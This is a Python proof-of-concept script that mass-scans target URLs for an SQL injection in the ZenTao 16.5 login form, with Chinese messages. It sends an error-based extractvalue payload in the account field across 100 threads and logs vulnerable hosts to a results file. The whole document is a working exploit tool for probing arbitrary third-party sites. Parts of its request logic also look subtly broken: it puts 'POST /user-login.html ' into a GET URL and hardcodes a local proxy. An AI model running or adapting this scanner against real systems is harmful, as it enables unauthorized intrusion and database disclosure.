#禅道 16.5 router.class.php SQL注入漏洞

import requests,argparse,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test = """ 
                ███████╗ ██████╗ ██╗          ████████╗██╗███╗   ███╗███████╗
                ██╔════╝██╔═══██╗██║          ╚══██╔══╝██║████╗ ████║██╔════╝
                ███████╗██║   ██║██║             ██║   ██║██╔████╔██║█████╗
                ╚════██║██║▄▄ ██║██║             ██║   ██║██║╚██╔╝██║██╔══╝
                ███████║╚██████╔╝███████╗███████╗██║   ██║██║ ╚═╝ ██║███████╗
                ╚══════╝ ╚══▀▀═╝ ╚══════╝╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚══════╝
                                               author:sanhua
                                               ate:2024-09-13
                                               version:1.0
    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="禅道 16.5 router.class.php SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = 'POST /user-login.html '
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = 'account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+user%28%29%29%2C0x7e%29%29%29%23'
    try:
        res1 = requests.get(url=target+payload,data=data,timeout=10, verify=False,proxies=proxies)
        if '远程登录' in res1.text:
            print(f"[+]该url:{target}存在sql注入漏洞")
            with open('禅道_result.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在sql注入漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()